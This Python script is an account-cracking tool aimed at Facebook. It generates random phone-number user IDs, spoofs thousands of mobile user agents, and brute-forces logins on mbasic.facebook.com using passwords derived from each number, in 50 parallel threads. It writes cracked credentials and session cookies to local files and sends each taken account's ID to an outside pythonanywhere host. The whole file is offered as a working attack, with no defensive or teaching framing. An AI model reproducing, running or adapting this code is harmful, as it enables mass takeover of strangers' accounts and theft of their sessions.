import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 10; moto g(8) play Build/QMDS30.47-33-5; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 10; moto g(8) play Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/348.0.0.8.103;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)  
          
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 11; moto g(50) 5G Build/RRSS31.Q2-54-59-4; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 11; moto g(50) 5G Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)   
logo =("""\033[1;32m 
\033[1;91m ╦  ╔═╗╔═╗╔═╗╔╗╔╔╦╗═╗ ╦╔═╗╦ ╦  ╦╦
\033[1;97m ║  ║╣ ║ ╦║╣ ║║║ ║║╔╩╦╝╠═╣║ ╚╗╔╝║
\033[1;32m ╩═╝╚═╝╚═╝╚═╝╝╚╝═╩╝╩ ╚═╩ ╩╩═╝╚╝ ╩ """)

def uf():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    mr1 = '0171'
    mr2 = '0172'
    mr3 = '0175'
    mr4 = '017'
    code = random.choice([mr1,mr2,mr3]) 
    os.system('clear')
    print(logo)
    limit = int(input(f'[+] PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(f' TOTAL  IDS: '+tl)
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            morshed.submit(rcrack,uid,pwx,tl)
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            sys.stdout.write(f'\r[FINDING]\033[1;92m%s\033[m\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                cix = coki.split('c_user')[1]
                cid = cix[0:15]
                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
                if 'LOCK' in res:
                    return 'LOCK'
                else:
                    print('\r\r\033[1;32m[OK] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
                    cek_apk(session,coki)
                    open('/sdcard/BLACK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                    oks.append(cid)
                    break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\033[1;91m[CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/BLACK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
uf()